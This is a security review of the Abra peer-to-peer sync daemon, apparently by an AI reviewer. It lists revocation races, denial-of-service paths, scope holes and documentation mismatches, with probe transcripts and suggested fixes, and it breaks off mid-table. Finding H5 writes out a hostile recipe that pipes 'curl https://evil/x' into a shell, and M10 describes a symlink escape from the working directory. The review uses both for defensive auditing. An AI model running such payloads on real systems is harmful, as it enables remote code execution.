# Stage 4 security review — Abra v1 primitive (commit `ae68fa9`)

Reviewer: Claude Opus 5, security-focused cross-review.
Repo: `/Users/vividh/Desktop/abra` @ `ae68fa98e48fe833ab69d5359ab92bf0e63b7522` (unmodified; all probes ran from `/tmp/abra-probe`, a scratch crate with path dependencies).
Authoritative texts: `SPEC.md`, `DESIGN.md`, `docs/API.md`.

**Baseline verified:** `cargo test --workspace` → **62 passed, 0 failed**. `two_real_processes_pair_send_and_accept_byte_identically` (real `abra daemon` processes, default iroh transport) passes on this host. The claim of "62 tests, iroh two-process works" is accurate.

**Four defects below were confirmed by executing code, not by reading it** — H1, H4, H6, M8. Probe transcripts are quoted inline.

Severity: **CRITICAL** = remote compromise or silent authorization failure. **HIGH** = security control that does not hold, or an advertised feature that is inert/broken in a way an app would build on. **MEDIUM** = exploitable degradation, information disclosure, or correctness loss under normal use. **LOW/INFO** = hygiene, docs, latent risk.

---

## Summary table

| # | Sev | Area | One line |
|---|-----|------|----------|
| H1 | **CRITICAL** | revocation | A concurrent connection handler silently un-revokes a revoked guest (**proven**) |
| H2 | **HIGH** | revocation | Cross-device revocation and cross-device guest acceptance are unimplemented dead code; SPEC claims flooding |
| H3 | **HIGH** | guest lifecycle | `now` is frozen for a whole inbound connection — token expiry never fires mid-session |
| H4 | **HIGH** | standing grants | Auto-accept works exactly once, then wedges every grant forever (**proven**) |
| H5 | **HIGH** | recipes | Recipe execution is unreachable dead code — and if reached, is unvalidated RCE contradicting `DESIGN.md` |
| H6 | **HIGH** | guest lifecycle | Guests can never send; `--send` scope is inert (**proven**) |
| H7 | **HIGH** | daemon surface | One idle TCP/QUIC connection stalls the entire accept loop; unbounded per-connection full-store loads |
| M1 | MEDIUM | scope | Capsule scope is unenforced whenever `capsule_id` is absent — i.e. for all inbox traffic |
| M2 | MEDIUM | escalation | Local control API has no role check: a guest daemon mints enrollment tokens and pairing tickets (**proven**) |
| M3 | MEDIUM | disclosure | `enroll-ok` hands every enrolling guest the issuer's entire trust store |
| M4 | MEDIUM | disclosure | Pending acks are broadcast to every trusted peer that connects |
| M5 | MEDIUM | watch | Event log interleaves/corrupts under concurrency; `watch` re-reads the whole file every 100 ms and holds a control slot forever |
| M6 | MEDIUM | concurrency | Single-use tickets, token binding, and control-nonce replay defence all fail across concurrent connections |
| M7 | MEDIUM | pairing | Interactive pairing has an unrecoverable crash window that burns the ticket |
| M8 | MEDIUM | UX/API | `abra://join/<token>` is printed and documented but rejected by `abra join` (**proven**) |
| M9 | MEDIUM | credentials | Enrollment tokens are passed as argv — visible in `ps` to every local user |
| M10 | MEDIUM | recipes | Recipe `cwd` escapes the materialized root through an intermediate symlink |
| M11 | MEDIUM | process mgmt | Kill-by-stored-PID with no liveness/reuse guard; children orphaned on shutdown |
| M12 | MEDIUM | outbox | Snapshot-then-merge silently reverts a concurrent `abra cancel` |
| M13 | MEDIUM | leases | No lease record ever crosses the wire; `lease take` is invisible to other devices; guest lease scopes unreachable |
| M14 | MEDIUM | control | Control messages are recorded but act on nothing — including the recipes the same daemon spawns |
| M15 | MEDIUM | resources | Unbounded inbox/disk growth; 256 MiB fully-buffered object streams |
| L1 | LOW | docs | No relays, no discovery, no NAT traversal ship — `DESIGN.md` says otherwise; TCP "fallback" is loopback-only |
| L2 | INFO | crypto | Single ed25519 key across iroh TLS, TCP challenge, and app records (binding itself is sound) |
| L3 | LOW | pairing | `pair-request` persisted and shown to the operator before its peer id is checked |
| L4 | LOW | build | `cadabra --no-default-features` does not compile |
| L5 | LOW | dead code | `retry_fresh`, `MAX_OBJECT_STREAMS`, `authorize_offer/ack/fetch` have no production callers |
| L6 | LOW | pairing | Expired pair tickets honoured for a further 60 s of skew |

---

## CRITICAL

### H1. A concurrent connection handler silently un-revokes a revoked guest — CRITICAL

**Where:** `crates/cadabra/src/lib.rs:279-282` (a fresh `DeliveryNode::open` per inbound connection), `crates/cadabra/src/lib.rs:428-432` (`handle` replaces `*self.node` with a fresh `DeliveryNode::open` on *every* control request), `crates/abra-net/src/auth.rs:241-251` (`TrustStore::save` serialises the whole in-memory `TrustDisk` over `net/trust.json`).

**Defect.** There is no single owner of trust state. Every inbound connection gets its own `TrustStore` snapshot, every control request gets another, and each one persists by rewriting the entire file from its own stale copy. Last writer wins over the whole document — including `revoked`, `peers`, `used_tickets`, `bound_tokens`, and `control_nonces`.

**Concrete failure scenario.** A guest is connected (its handler holds a snapshot taken before revocation). The operator runs `abra revoke <token_id>`; that path opens its own node, sets `revoked`, drops the guest from `peers`, and saves. The still-live handler then writes `trust.json` for any reason — `consume_control_nonce` (`auth.rs:607-616`), `confirm_pair` (`:333-348`), `bind_enrollment` (`:406-478`) all call `save()` — and the revocation disappears together with the guest's removal from `peers`. The guest is trusted again, permanently, with no error anywhere.

Proven (`/tmp/abra-probe/src/bin/p3.rs`, real `DeliveryNode`s on one root):

```
handler sees guest trusted: true
after revoke on disk: revoked=true peer_present=false
AFTER handler save: revoked=false peer_present=true
>>> revocation lost: true
```

This is the single most serious finding: revocation is the only mechanism that bounds a guest, and it can be undone by ordinary, non-adversarial daemon traffic. A guest that keeps a connection open *while* it is revoked will, in the common case, un-revoke itself.

**Fix.** One `TrustStore` owned by the daemon, shared behind the existing `Arc<Mutex<DeliveryNode>>`, used by connection handlers instead of `DeliveryNode::open` per connection. If per-connection stores must stay, take an exclusive `flock` on `net/trust.json` and re-read-then-merge inside `save()`, or restructure trust as an append-only record log (which the codebase already does for capsules — `store.rs:434-451`) rather than a single rewritten document.

---

## HIGH

### H2. Cross-device revocation and cross-device guest acceptance are unimplemented — HIGH

**Where:** `crates/abra-net/src/auth.rs:385-402` (`apply_revocation`), `:479-507` (`accept_bind_cert`), `:995-1021` (`RevocationRecord`) — a workspace-wide grep finds **no callers outside `crates/abra-net/tests/net_spec.rs`**. `crates/cadabra/src/lib.rs:495-499` implements `revoke` as a purely local `trust.revoke_token`.

**Defect.** `SPEC.md:600-603` states the revocation record *"floods to all trusted peers"* and that *"revocation is fail-open until the record propagates"*. Nothing floods. There is no `revoke` frame in the demux (`delivery.rs:729-997`), no send path, no receive path. Symmetrically, `SPEC.md:593-594` states other full peers accept a guest via a bind certificate; `BindCertificate` is minted (`auth.rs:468-477`) and shipped in `EnrollOk` (`delivery.rs:980-984`), but `accept_bind_cert` is never called, so a guest is only ever known to the one device it enrolled against.

**Concrete failure scenario.** Two effects, both bad. (a) Because guests never propagate, a "mesh" of devices A and B where a guest enrolled at A means B has no idea the guest exists — every claim about mesh-wide guest semantics is vacuous. (b) If propagation is later added without revocation propagation, revoking at A leaves the guest fully live at B forever. Today the risk is the documentation: an external app author reading SPEC will assume revocation is mesh-wide and design around a guarantee that does not exist.

**Fix.** Either implement it — a `revoke` frame carried on every trusted session plus a replay of pending revocations on connect, mirroring the existing pending-ack replay at `delivery.rs:702-707` — or amend `SPEC.md:593-603` and `docs/API.md:35` to say revocation and guest trust are device-local, and delete the dead types so a future reader does not assume they work.

### H3. `now` is frozen for the lifetime of an inbound connection — HIGH

**Where:** `crates/abra-net/src/delivery.rs:699` — `handle_connection(&mut self, connection: &mut Connection, now: u64)`; `crates/cadabra/src/lib.rs:282` passes `now_ms()` once, at accept time. That one value is then used for every frame in the loop: guest expiry (`:449-452` via `validate_incoming_offer`), local guest token verification (`:470`), control freshness and nonce retention (`:913`), ack timestamps (`:884-891`), and the 600-second pairing wait (`:933-953`).

**Defect.** Every time-based authorization check on an inbound connection evaluates against the moment the connection was accepted, not the moment the frame arrived.

**Concrete failure scenario.** A guest whose token expires at T opens a connection at T−1s and never closes it. `validate_incoming_offer`'s check `now > end` (`delivery.rs:449-452`) uses `now = T−1s` forever, so the guest keeps delivering in-scope snapshots for hours or days past expiry. Independently: the pair-request path can sleep up to 600 s inside the loop (`:936-953`), after which `accept_pair_request` checks ticket expiry against a `now` that is ten minutes stale (`auth.rs:301`), extending a 10-minute pair ticket to effectively 20.

**Fix.** Take `now` per frame — replace the parameter with a `now_fn: &dyn Fn() -> u64` or simply call `abra_core::now_ms()` at the top of each loop iteration and pass it down. Add a wall-clock session cap for guests.

### H4. Standing grants are one-shot, then wedge every grant permanently — HIGH

**Where:** `crates/cadabra/src/lib.rs:889-891` — `materialize(&node.store.cas, &files, destination)` writes into the grant's fixed `destination`; `crates/abra-core/src/cas.rs:429-434` refuses a non-empty destination. The `?` at `lib.rs:890` aborts the whole `apply_receive_grants` loop.

**Defect.** The second delivery under a grant cannot materialize, so `apply_receive_grants` returns `Err` before marking anything read. Because the loop iterates unread inbox entries and bails on the first failure, that one stuck entry blocks auto-accept for **every** grant and every peer from then on, permanently, across restarts.

**Concrete failure scenario.** Proven (`/tmp/abra-probe/src/bin/p1.rs`, two real daemons over the loopback transport, grant `peer=A kind=dev.abra.bundle auto_accept auto_run_recipes to=<dest>`):

```
after delivery 1: dest exists=true contents=["f1"]
inbox after 1: [... "read":true ...]
cadabra: receive policy error: invalid: materialization destination must be empty
after delivery 2: contents=["f1"]
inbox after 2 (read flags): 4c064744=true be82a15b=false
```

The second bundle never lands, stays unread forever, and poisons the queue. A showcase app built on "standing grants" would work once in the demo and never again.

**Fix.** Materialize into a per-delivery subdirectory (`destination/<snapshot_id>/`), or into a staging dir followed by an atomic swap. Independently: make the loop failure-isolating — `continue` on per-entry error, record the failure on the entry (and surface it in `abra status` alongside `outbox_errors`), so one bad delivery cannot block the rest.

### H5. Recipe execution is unreachable dead code — and, if reached, unvalidated RCE — HIGH

**Where:** `crates/cadabra/src/lib.rs:893-918`.

**Defect, part 1 — it can never run.** Recipes are Full-scope only: `crates/abra-core/src/manifest.rs:211-219` rejects any Partial manifest carrying `recipes`. Full-scope manifests are committed to the capsule shelf, never the inbox: `crates/abra-net/src/delivery.rs:397-412` routes `Scope::Full` to `receive_full` and `Scope::Partial` to `receive_partial`, and `crates/abra-core/src/store.rs:166-168` hard-rejects a non-Partial in the inbox. `apply_receive_grants` iterates **only** `node.store.inbox` (`lib.rs:865-871`). Therefore `raw.manifest().recipes` at `lib.rs:894` is always `None` and the spawn at `:904` is unreachable. There is also no CLI or daemon op anywhere that sets `manifest.recipes`, so Abra cannot even produce a recipe-bearing snapshot. The headline P2 capability — "the first place the daemon executes payload-derived code" — executes nothing.

**Defect, part 2 — the code that would run is unconstrained.** If the routing is fixed as intended:

```rust
let mut command = std::process::Command::new(&recipe.argv[0]);
command.args(&recipe.argv[1..]).current_dir(cwd).envs(&recipe.env);
let child = command.spawn()?;
```

`argv[0]` is an arbitrary attacker string resolved via the daemon's `PATH` — `/bin/sh -c '…'` is a legal recipe. `recipe.env` is applied verbatim on top of the daemon's inherited environment, so `LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`, `PATH`, `SSH_ASKPASS` are all attacker-settable. The child inherits the daemon's stdio and environment. There is no argv allowlist, no requirement that the executable live inside the materialized root, no signature pin, no interactive confirmation, no resource limit. The grant is `(peer, kind)` only (`lib.rs:875-879`) — exact on both, which is correct as far as it goes, but a peer granted `auto_run_recipes` for one kind can smuggle *any* argv under that kind. The grant is, in effect, "this peer may execute arbitrary code as me, forever, silently".

`DESIGN.md:254` lists as a **non-goal**: *"Executing anything. Not recipes, not payloads, not adapters' logic."* — directly contradicted by `lib.rs:899-904`, and self-contradicted by `DESIGN.md:111-113`.

**Concrete failure scenario (post-fix-to-routing).** Peer B holds a `--kind dev.abra.workspace --auto-run-recipes` grant on A. B pushes a workspace snapshot whose recipe is `argv: ["/bin/sh","-c","curl https://evil/x|sh"], env: {"PATH":"/tmp/evil"}`. A's daemon spawns it as A's user with A's environment on the next connection close. No prompt, no log beyond a `ps` row.

**Fix.** Decide which product this is. If recipes must run: (a) route Full-scope manifests to the grant evaluator explicitly rather than relying on the inbox; (b) require `argv[0]` to canonicalize inside the materialized root and be a regular, non-symlink, exec-bit file from the snapshot; (c) `command.env_clear()` then apply a fixed allowlist, never attacker keys; (d) pin the grant to an argv hash or require an interactive confirm on first sight of a new argv; (e) run in a process group with rlimits and captured stdio. If recipes must not run: delete `lib.rs:893-918` and the `auto_run_recipes` flag. Either way, reconcile `DESIGN.md:254`.

### H6. Guests can never send — the `send` scope and `abra enroll --send` are inert — HIGH

**Where:** `crates/abra-net/src/delivery.rs:264-268` (`enqueue`) and `:578-588` (`send_offer_inner`) both gate on `self.allow_agent_send`. It is initialised `false` at `:212`, copied at `:233`, and **never set to `true` anywhere in the daemon or CLI** — the only assignment in the workspace is `crates/abra-net/tests/net_spec.rs:413`.

**Defect.** A guest daemon rejects every send with `authorization: local agent sending disabled`, regardless of its token's `send: true` scope. Half the scope model is unreachable.

**Concrete failure scenario.** Proven (`/tmp/abra-probe/src/bin/p2.rs`), with a token minted `send:true, receive:true, kinds:["dev.abra.bundle"]`:

```
guest joined: {... "scopes":{... "send":true, "receive":true ...}}
  guest send REFUSED: authorization: local agent sending disabled
  guest out-of-kind-scope send REFUSED: authorization: local agent sending disabled
```

Receive works correctly in the same run (out-of-scope kind rejected, in-scope kind accepted), so the guest flow is exactly half-built. `abra enroll --send` mints a scope the daemon will never honour — a silent lie in the CLI surface.

**Fix.** Either wire `allow_agent_send` to a daemon flag / control op and default it from the token's `send` scope, or remove `send` from `Scopes` and `--send` from the CLI so the surface stops promising it. Add the daemon-level guest send test that would have caught this.

### H7. One idle connection stalls all inbound accepts; unbounded per-connection store loads — HIGH

**Where:** `crates/abra-net/src/transport.rs:436-446` — iroh `accept()` awaits `incoming.await` and then `Self::wrap(conn, false)`, which awaits `conn.accept_bi()`, **inline on the accept path**, with no timeout. `:256-259` — TCP `accept()` awaits the full `authenticate()` handshake (four blocking `read_exact` calls, `:170-192`) inline, no timeout. `crates/cadabra/src/lib.rs:276-291` spawns an unbounded task per connection, each of which calls `DeliveryNode::open` (`crates/abra-core/src/store.rs:60-120, 275-322`), loading every capsule, every snapshot manifest, and the entire inbox into memory.

**Defect.** Three compounding unauthenticated denial-of-service paths.

**Concrete failure scenarios.**
1. A peer opens one QUIC connection and never opens a bidirectional stream. `Endpoint::accept()` never returns for anyone else. The daemon accepts no further inbound connections until restart. No authentication is required to reach this — ALPN negotiation suffices.
2. Even with (1) fixed, N concurrent connections mean N full in-memory copies of the store. A device with a 500 MB inbox and 50 connections is out of memory.
3. `delivery.rs:933-953` lets any peer hold a connection for 600 s per pair-request while writing a file into `net/pending-pairs/<attacker-chosen peer id>` (`:930-932`), unbounded in count.

**Fix.** Move `wrap()`/`authenticate()` off the accept loop into the spawned task, wrap both in `tokio::time::timeout`, bound in-flight inbound sessions with a `Semaphore` (as the control API already does at `lib.rs:230, 241`), share one store/`TrustStore` across handlers (also fixes H1), and cap `pending-pairs` count and lifetime.

---

## MEDIUM

### M1. Capsule scope is unenforced whenever `capsule_id` is absent

**Where:** `crates/abra-net/src/auth.rs:185-192`:

```rust
Self::list_allows(&self.kinds, kind)
    && capsule.is_none_or(|c| Self::list_allows(&self.capsules, &c.to_hex()))
```

`is_none_or` returns `true` for `None`, so a manifest with no `capsule_id` passes the capsule check unconditionally. Every Partial manifest has no `capsule_id` (`manifest.rs:211-219` forbids it) — that is *all* inbox traffic: `abra send --path`, `abra send --link`, every handoff.

**Concrete failure scenario.** Confirmed in the p2 probe: a guest scoped to `capsules: ["<one specific capsule>"]` received a capsule-less `dev.abra.bundle` bundle without objection. So `--capsule <id>` on `abra enroll` restricts only capsule-shelf traffic; the operator reasonably reads it as "this guest can only touch capsule X", and it does not bound the inbox at all. The same hole applies on the send side (`delivery.rs:455`) and would matter more once H6 is fixed.

**Fix.** Treat `None` as out of scope unless `capsules == ["*"]`, or add an explicit `inbox: bool` scope bit and require it for capsule-less deliveries. Document which one you chose in `SPEC.md`.

### M2. Local control API applies no role check — a guest daemon mints tokens and pairing tickets

**Where:** `crates/cadabra/src/lib.rs:437-532` — `pair-ticket` (`:454`), `enroll-mint` (`:493`), `revoke` (`:495`), `policy-grant` (`:500`), `lease-take` (`:516`), `control` (`:514`) are dispatched with no reference to `trust.local_role()`. Role is enforced on the wire (`control.rs:96-98`, `delivery.rs:437-477`) but not locally.

**Concrete failure scenario.** Proven in the p2 probe — a daemon running as a scoped guest:

```
  guest MINTED a token (escalation): abra-enroll/1/eyJiaW5kX2J5IjoiMjAyNi0wOC
  guest MINTED a pair ticket (escalation): abra-pair/1/eyJhZGRyZXNzZXMiOltdLCJleHBp
  guest REVOKED locally: {"revoked":"f47d2e8aec9196259853dfb474866194"}
```

The guest minted a `capsules:["*"] kinds:["*"]` enrollment token under its own key and a pair ticket that makes any redeemer a **Full** peer of the guest. The host's data is not directly reachable (guest-to-guest is blocked at `auth.rs:520-527` and `delivery.rs:437-441`, and H6 currently blocks sends), but a guest becoming an enrollment and pairing authority is not the intended trust model, and the blocker is an unrelated bug that is on the fix list.

**Fix.** Gate `pair-ticket`, `enroll-mint`, `revoke`, `policy-grant`, `lease-take` and `control` on `matches!(node.trust.local_role(), LocalRole::Full)`, returning a clear "this daemon is a guest" error.

### M3. `enroll-ok` discloses the issuer's entire trust store to every enrolling guest

**Where:** `crates/abra-net/src/delivery.rs:979` — `let mesh = self.trust.peers().values().cloned().collect();` shipped in `EnrollOk` (`auth.rs:778-785`).

**Defect.** `TrustedPeer` (`auth.rs:200-210`) carries `peer_id`, `name`, `role`, `x25519_pk`, `token_id`, `scopes`, `expires_at`. Every guest that binds receives the full record for **every other guest**, including their token ids, their exact scopes, and their expiry. The guest's own `join` only *installs* the Full entries (`lib.rs:178-182`), but the whole set is on the wire and in the guest's process.

**Concrete failure scenario.** A contractor enrolled for one capsule learns the identity, capsule list, and token id of every other contractor and every device on the mesh. That is a roster leak, and the token ids are the exact strings a future revocation-flood implementation (H2) would key on.

**Fix.** Filter to `role == Full` before sending, and project down to `{peer_id, name, x25519_pk, addresses}`.

### M4. Pending acks are broadcast to every trusted peer that connects

**Where:** `crates/abra-net/src/delivery.rs:702-707` — on any trusted session, every persisted pending ack is written to that peer.

**Defect.** An `Ack` (`:111-121`) carries `offer_id`, `snapshot_id`, `shelf`, `received_at` and the receiver's signature. They are replayed to whoever connects next, not to the sender they were minted for.

**Concrete failure scenario.** A guest connects to fetch one in-scope snapshot and receives signed acknowledgements revealing the snapshot ids and arrival times of unrelated deliveries from other peers — including deliveries in capsules and kinds outside its scope. Also unbounded write amplification if the pending-ack directory grows.

**Fix.** Filter to acks whose sender is `connection.peer_id()`. The ack payload already binds the sender (`:123-138`), so the information is available.

### M5. Event log corrupts under concurrency; `watch` re-reads the whole file and never yields its slot

**Where:** `crates/abra-net/src/delivery.rs:368-381` and `crates/cadabra/src/lib.rs:1103-1111` (writers); `crates/cadabra/src/lib.rs:406-424` (`serve_watch`); `:956-963` (`events`); `:38-40, 241` (control-client semaphore of 64).

**Defects, four of them.**
1. `serde_json::to_writer(&mut file, value)` writes unbuffered directly to the `File`, emitting many small `write(2)` calls, and the trailing `\n` is a separate call. Concurrent connection handlers and `record_event_file` append to the same path from different tasks and different `DeliveryNode`s, so lines interleave and the NDJSON is corrupted.
2. `events` (`:958-962`) parses every line and `?`s on the first failure — one corrupt line makes the whole op fail forever.
3. `serve_watch` does `fs::read(&path)` — the **entire** log — every 100 ms, per client, forever. With 64 watchers and a 100 MB log this is tens of GB/s of read amplification.
4. `sent` is a byte offset into a re-read file: if the log is ever truncated or rotated, `bytes.len() < sent` resets to 0 and the whole history is replayed to the client as if new. Partial writes are also streamed, so a client can receive half a JSON object. `serve_watch` bypasses `CONTROL_IDLE_TIMEOUT` and holds one of the 64 control slots until shutdown — 64 `abra watch` sessions lock every other CLI command out of the daemon.

**Fix.** One event writer (behind the daemon mutex) that serialises to a `Vec<u8>` and does a single `write_all` on an `O_APPEND` handle; rotate/cap the log; have `serve_watch` hold an open file and `seek`/read incrementally, splitting on complete lines only; give watchers a separate quota from request clients; make `events` skip-and-count bad lines.

### M6. Concurrent handlers defeat single-use tickets, token binding, and control-nonce replay defence

**Where:** same root cause as H1. `used_tickets` (`auth.rs:298, 307`), `bound_tokens` (`:443-454`), `control_nonces` (`:607-616`) all live in per-connection `TrustStore` copies.

**Concrete failure scenarios.**
- Two attackers redeem the same pair ticket simultaneously; both handlers see it in `pending_tickets` and neither sees the other's `used_tickets` insert, so both are paired as Full peers. The "ticket is single-use" property does not hold under concurrency.
- Two guests bind the same unbound token simultaneously; the `token already bound` check at `:443-451` reads a stale map, both succeed, and whichever saves last determines which one survives in `peers` — a coin flip, not a decision.
- A control message replayed on a second, concurrent connection is not seen as replayed, because the nonce was consumed in a different in-memory copy.

**Fix.** Shared trust state (H1). Until then these three defences are advisory.

### M7. Interactive pairing has an unrecoverable crash window that burns the ticket

**Where:** `crates/abra-net/src/auth.rs:307` (ticket marked used) and `:318-324` (peer parked in `awaiting_pair_confirm` when `confirm_immediately` is false); `crates/cadabra/src/lib.rs:564-566` — the joiner writes `pair-confirm` and returns without waiting for any acknowledgement; `delivery.rs:968-971` — the issuer applies it with no reply.

**Concrete failure scenario.** In the non-`--yes` path, the connection drops after `pair-accept` and before the issuer reads `pair-confirm`. The joiner has the issuer in its trust store; the issuer does not have the joiner; the ticket is already in `used_tickets` so a retry fails with `ticket is not pending`. The operator must mint a new ticket, and the stale `awaiting_pair_confirm` entry is never expired or garbage-collected (unbounded growth). This is the exact path with **zero test coverage** (see §Test adequacy).

**Fix.** Have the issuer reply to `pair-confirm` and have the joiner wait for it before declaring success; expire `awaiting_pair_confirm` entries at ticket expiry; do not move the ticket to `used_tickets` until the pairing is complete on the issuer side (keeping the in-flight marker separate so it still cannot be redeemed twice).

### M8. `abra://join/<token>` is printed and documented but rejected

**Where:** `crates/abra-cli/src/main.rs:304-310` prints both the bare token and `abra://join/{token}`; `README.md:90` and `docs/API.md:56` document the URL form. `Daemon::join` (`lib.rs:137`) calls `EnrollmentToken::parse`, which only strips `abra-enroll/1/` (`auth.rs:846-851`).

**Concrete failure scenario.** Proven (p1 probe): feeding the CLI's own second output line back to `abra join` yields `protocol: bad enrollment prefix`. Every user who copies the URL — the more shareable of the two lines the tool prints — hits an error with no hint that they should have copied the other line.

**Fix.** Strip an optional `abra://join/` prefix in `EnrollmentToken::parse` (or in `Daemon::join` before parsing) and add a smoke test that round-trips the printed URL.

### M9. Enrollment tokens are passed as argv

**Where:** `crates/cadabra/src/main.rs:13-14` (`--token`), `crates/abra-cli/src/main.rs:27-28, 203-205, 256`.

**Defect.** The enrollment token is a bearer credential valid for up to 30 days (`auth.rs:817-819`) and, for the unbound form the CLI always mints (`lib.rs:788-804` passes `audience: None`), redeemable by the first peer to bind within 15 minutes. Passing it as a command-line argument exposes it in `/proc/*/cmdline` and `ps` output to every local user for as long as the daemon runs.

**Fix.** Accept `--token-file`, `--token -` (stdin), or an env var; document that argv is unsafe. Consider defaulting to audience-pinned tokens where the guest's peer id is known.

### M10. Recipe `cwd` escapes the materialized root through an intermediate symlink

**Where:** `crates/cadabra/src/lib.rs:1089-1101` (`safe_recipe_cwd`) and `:1079-1087` (`validate_destination`).

**Defect.** `safe_recipe_cwd` rejects absolute paths and `..` components, then calls `validate_destination(root.join(relative))`, which checks only whether the **final** path is itself a symlink. Intermediate components are not checked, and `materialize` legitimately creates symlinks with fully attacker-controlled targets (`crates/abra-core/src/cas.rs:469-477` — `EntryMode::Link` writes `symlink(target, path)` where `target` is blob content).

**Concrete failure scenario.** A snapshot ships a tree entry `s` of mode `Link` whose blob is `/`, plus a recipe with `cwd: "s/etc"`. `root.join("s/etc")` is not itself a symlink, so the check passes, and the recipe runs with cwd `/etc`. (The core test `hostile_symlink_tree_cannot_write_outside_destination` at `cas.rs:912` correctly covers *materialization*, which never follows links — it does not cover later consumers that do.) This is subordinate to H5 (argv is already unrestricted), but it is the concrete answer to "symlink games in the materialized root" and it will still be a hole after argv is fixed.

**Fix.** `fs::canonicalize` the joined path and assert `starts_with` the canonicalized root; better, resolve component-wise from a root fd opened `O_DIRECTORY`, with `O_NOFOLLOW` on each step.

### M11. Kill-by-stored-PID with no liveness or reuse guard; children orphaned on shutdown

**Where:** `crates/cadabra/src/lib.rs:936-955` (`stop_recipes`), `:923-935` (`load_processes`/`save_processes`), `:904-917` (registration), `:76-84` (`RunningDaemon::shutdown`).

**Defects.** (a) `stop_recipes` shells out to `Command::new("kill")` — resolved through the daemon's `PATH` — with a pid read from a JSON file that is never reaped; a recycled pid means an unrelated process is signalled. (b) `load_processes` never checks liveness, so `abra ps` reports dead processes indefinitely. (c) `RunningDaemon::shutdown` sends the watch signal and awaits only the four top-level tasks; spawned recipe children are never signalled, so SIGTERM leaves orphans running. (d) The capsule key falls back to the snapshot id for capsule-less manifests (`:906-909`), so `abra stop-recipes --capsule <capsule>` cannot address them.

**Fix.** Retain `std::process::Child` handles in memory keyed by an id, use `libc::kill`/`nix::sys::signal` rather than a subprocess, verify the process is still the one you started (start time or a pidfd/process group), spawn into a new process group and kill the group on shutdown, and give recipes a stable handle independent of capsule presence.

### M12. Snapshot-then-merge silently reverts a concurrent cancel

**Where:** `crates/abra-net/src/delivery.rs:228-243` (`outgoing_session` → `outbox.detached()`), `crates/abra-net/src/outbox.rs:107-123` (`detached` / `sync_entry_from`), `crates/cadabra/src/lib.rs:322-335`.

**Defect.** The merge writes the session's whole entry back over the live one. Scoping the merge to a single id (the stage-4 hotfix) correctly protects *other* entries, but not this one.

**Concrete failure scenario.** A large send is in flight. The user runs `abra cancel <id>`; `Outbox::cancel` sets `Cancelled` and persists (`outbox.rs:266-278`). The session then finishes and `sync_entry_from` overwrites the entry with its stale `Transferring`/`Queued` copy. The cancellation vanishes with no error and the outbox worker retries the send the user just cancelled. (`attempts` semantics themselves are correct after the hotfix: `send_offer` returns early on active backoff at `delivery.rs:487-491` before any `fail_attempt`, verified by `outbox.rs:290-316`.)

**Fix.** Re-read the live entry under the lock before merging and refuse the write if it has reached a terminal state; or merge specific fields (`state` only when it advances, plus `attempts`/`last_error`/`ack_sig`).

### M13. Leases never cross the wire; guest lease scopes are unreachable

**Where:** grep for `LeaseRecord` in `crates/abra-net/src/delivery.rs` finds only `:46`, `:625`, `:875` — the `genesis_grant` field, which is consumed **only** when the receiver lacks the capsule entirely (`:868-881`). `crates/cadabra/src/lib.rs:1006-1039` (`renew_leases`), `:973-1005` (`lease_take`).

**Defects.** (a) No protocol message carries a lease record for a capsule the peer already has, so `abra lease take` on device B is invisible to device A. A's `renew_leases` sees its own lease still winning and keeps refreshing at `epoch+1` forever; B does the same; both believe they hold the lease. Auto-renewal does not "fight" takeover — it never learns of one. Split-brain is the default, not the exception. (b) `lease_take` calls `authorize_lease(local, true, now)` (`:985`) with the **local** peer id, which is never present in the local trust store, so it always fails with `untrusted peer` — the guest lease path is unreachable. `enroll` hardcodes `lease_acquire: false, lease_takeover: false` (`:785-786`) with no CLI flag to set them, so `Scopes::lease_*` and `authorize_lease` are together dead code.

**Fix.** Either carry lease records on the wire (piggyback the capsule's lease set on each offer for capsules the peer already holds, and accept via the existing `Capsule::accept_lease` epoch/prev-hash rules) and document the convergence semantics, or state plainly in `SPEC.md`/`DESIGN.md` that leases are a single-device advisory mechanism. Fix or delete `authorize_lease`.

### M14. Control messages are recorded but act on nothing

**Where:** `crates/abra-net/src/control.rs:72-105` (verify), `crates/abra-net/src/delivery.rs:911-925` (record an event, reply `control-ack`).

**Defect.** Verification is solid — signer must be a trusted Full peer, signature checked, timestamp window `[-300 s, +60 s]`, nonce dedup with 600 s retention that comfortably exceeds the freshness window (`auth.rs:607-616`), so ordering/replay is sound in the single-connection case (see M6 for the concurrent case). But nothing consumes the result. `ControlOp::Stop` does not stop the recipe children the same daemon spawns (`lib.rs:904`); `Pause` pauses nothing. The one execution surface the daemon owns has no kill switch reachable from the control protocol it ships for exactly that purpose.

Secondary: `consume_control_nonce` calls `save()`, so every control message rewrites the whole `trust.json`. A trusted peer can drive unbounded write amplification and inflate the file with up to 600 s of nonces.

**Fix.** Route `Stop`/`Pause` into `stop_recipes` for the addressed capsule; store nonces in a separate, size-bounded file rather than `trust.json`.

### M15. Unbounded inbox growth; fully-buffered 256 MiB object streams

**Where:** `crates/abra-core/src/store.rs:166-195` (one file per delivery, no quota, no eviction); `crates/abra-net/src/delivery.rs:24-25, 819-821` (`accept_uni_bounded(MAX_OBJECT_SIZE + LEN)` reads a whole object into a `Vec`); `:744` (`bytes_hint <= MAX_OBJECT_SIZE` is the only quota).

**Concrete failure scenario.** Any trusted peer — including an in-scope guest — can fill the receiver's disk with inbox entries; there is no per-peer quota, no total cap, and no expiry. Each in-flight transfer can allocate 256 MiB, multiplied by the unbounded concurrent sessions of H7.

**Fix.** Per-peer and total inbox quotas with an eviction/expiry policy; stream objects to disk incrementally (the partial-file machinery at `:300-327` already exists — use it for the streaming read too) rather than buffering whole objects.

---

## LOW / INFO

### L1. The shipped transport has no relays, no discovery, and no NAT traversal — the docs say otherwise

**Facts.** `crates/abra-net/src/transport.rs:365` builds the endpoint with `iroh::endpoint::presets::Minimal`. In iroh 1.1.0 that preset sets **only** the rustls crypto provider (`presets.rs:62-79`); everything else comes from `Builder::empty()`, documented at `endpoint.rs:190` as *"no address lookup services, and `RelayMode::Disabled`"*. `crates/abra-net/Cargo.toml:26` uses `default-features = false`, so `portmapper` (UPnP/PCP/NAT-PMP) is compiled out too. There is no `RelayMode`, `Discovery` or `address_lookup` anywhere in `crates/`.

Consequences: no relay, no pkarr publish/resolve, no DNS discovery, no mDNS, no port mapping. `endpoint.addr()` will never contain a relay URL, so the "full `EndpointAddr`" on tickets is direct UDP addresses only. The bare-`EndpointId` dial fallback (`transport.rs:425-428`) fails deterministically with `No address lookup configured` (`address_lookup.rs:265-266, 624`) unless iroh already has a path to that peer in this process.

Doc claims that are false or misleading:

| Doc | Claim | Contradicted by |
|---|---|---|
